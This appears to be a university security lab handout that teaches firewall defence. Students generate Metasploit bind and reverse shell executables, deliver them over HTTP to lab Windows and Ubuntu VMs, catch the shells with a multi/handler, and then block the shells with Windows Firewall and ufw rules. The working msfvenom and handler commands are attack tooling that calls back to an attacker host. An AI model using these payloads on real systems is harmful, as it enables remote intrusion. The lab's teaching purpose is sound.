# Windows Firewall
## Description
With malware generated by Metasploit, 
- bind shell
- reverse shell

practice attacking Windows without protection.

## Equipment
- Both the Kali Linux VM 🐧 and the Windows server VM 🪟

## Prerequisite!!!
- [Lab01](../lab01/README.md) must be done first if you use a new Windows VM

## Tasks

Task 1: bind shell
---
- 1.1 What is a bind shell?
  - A bind shell listens on the target system, using a TCP or UDP port
  - This is a very simple attack, and very easily stopped by a firewall 
  - The default action of the Windows firewall is to block unexpected incoming packets, so stops this attack
- 1.2 Create a bind shell with msfvenom in Kali Linux VM 🐧, open a terminal
  ```bash
  # 1.2.1. find bind shell options, setup required options
  msfvenom -p windows/shell_bind_tcp --list-options

  # 1.2.2. create a bind shell
  msfvenom -p windows/shell_bind_tcp -f exe > ./bindShell.exe

  # 1.2.3. start a web server, wait for victims to download
  # keep the web server running
  sudo python3 -m http.server  80
  ```
- 1.3 On the Windows server VM 🪟, download and run bindShell.exe
  - open a browser and access http://Kali_IP/bindShell.exe
  - find the IP address of your Kali VM and replace Kali_IP in the URL
  - run bindShell.exe, ignore warnings and run anyway
- 1.4 view the listening process. Run a command prompt as Administrator
  ```cmd
  netstat -bano | more
  :: find bindShell.exe and its port number from the list
  ```
- 1.5 use the bind shell, on the Kali Linux VM 🐧, open another terminal
  ```bash
  # 1.5.1. connect the the bind shell
  nc Windows_IP 4444
  # A "Microsoft Window" banner appears

  :: Now you are in a windows command prompt
  :: 1.5.2. find the login account
  whoami 
  :: 1.5.3. view the network connection you are using
  netstat -an | findstr 4444
  :: don't exit or close this terminal
  ```

- 1.6 Block incoming connections to the bind shell
  - 1.6.1. On the Windows server VM 🪟, turn on Windows firewall from
    - Control Panel->System and Security->Windows Firewall ->Customize Settings
  - 1.6.2. Go back to the the previous Kali terminal with the remote Windows command prompt
    - type and commands such as help, dir, etc. you get no response
    - due the connection to bindShell.exe is blocked by Windows firewall


Task 2: reverse shell
---
- 2.1 What is a reverse shell?
  - A reverse shell originates the connection 
    - from the target server, sending a SYN out 
    - to the attacker's Command & Control server, 
      - which listens for incoming traffic
    - Any computer that allows Web browsing must allow connections to external IP addresses on common ports, such as 80 and 443, 
      - so this attack works even when Windows Firewall is on, in its default state.
- 2.2 Create a reverse shell
  - 2.2.1. on the Kali Linux VM 🐧, open another terminal
    ```bash
    # 1. list required options
    msfvenom -p windows/shell_reverse_tcp --list-options

    # 2. only LHOST is required, set it to be Kali_IP 
    msfvenom -p windows/shell_reverse_tcp LHOST=Kali_IP -f exe > reverseShell.exe

    # 3. start a Command-and-Control (C&C) server
    msfconsole
    use multi/handler
    set PAYLOAD windows/shell_reverse_tcp
    set LHOST 0.0.0.0
    exploit
    ```
  - 2.2.2. Launch the reverse shell on the Windows machine 🪟
    - open a browser, access http://Kali_IP/reverseShell.exe
    - download and run anyway
  - 2.2.3. Go back to the previous Kali Linux VM 🐧 terminal
    - 1. "command shell session" opens, run the following commands
      ```cmd
      # a. view the malware processes 
      tasklist /V /FI "IMAGENAME eq bindShell*"
      tasklist /V /FI "IMAGENAME eq reverseShell*"
      ```


Task 3: blocking outgoing connection with Windows firewall
---
- 3.1 From "Windows Firewall with Advanced Security", make sure Windows firewall is on for the three profiles
  - Domain profile
  - Private profile
  - Public profile
- 3.2 Create a outbound rule to block all TCP outbound connections
- 3.3 Go back to the previous Kali Linux VM 🐧 terminal, now the command shell session 1 is closed or becomes nonresponsive to any further commands
- 3.4 go back to the Windows machine 🪟, restore Windows firewall to its default state



## Extra credit (10%): Reverse shell on Linux

- e1. Setup an Ubuntu Linux machine, connect to the same NAT network as the Kali VM and Windows VM
- e2. Create a reverse shell malware on Kali
  ```bash
  # 1. create a reverse shell malware 
  msfvenom -p linux/x64/shell_reverse_tcp RHOST=Kali_IP -f elf > ./reverseShellLinux
  ```
- e3. Send the malware to Ubuntu by HTTP or FTP
- e4. In the reverse shell on Kali, find the malware connection
  ```bash
  # 1. start C&C
  msfconsole -q
  
  # 2. in msfconsole
  use multi/handler
  set PAYLOAD linux/x64/shell_reverse_tcp
  set LHOST 0.0.0.0

  # 3. after is running on Ubuntu
  exploit

  # 4. loot the Ubuntu victim machine
  whoami
  
  # 5. find the malware connection
  netstat -pant
  ```
- e5. Block outgoing connections with ufw on Ubuntu
  ```bash
  # 1. block outgoing connections with ufw
  sudo ufw default deny outgoing
  sudo ufw enable # go back to Kali, check the C&C

  # 2. turn off firewall
  sudo ufw disable
  ```


# Reference
- [samsclass: 15: Windows Firewall](https://samsclass.info/123/proj10/123p15fire.htm)
- [Malware attack](https://github.com/ufidon/its250/tree/master/labs/lab07)
- [filter in tasklist.exe does not take wildcards?](https://stackoverflow.com/questions/11746079/filter-in-tasklist-exe-does-not-take-wildcards)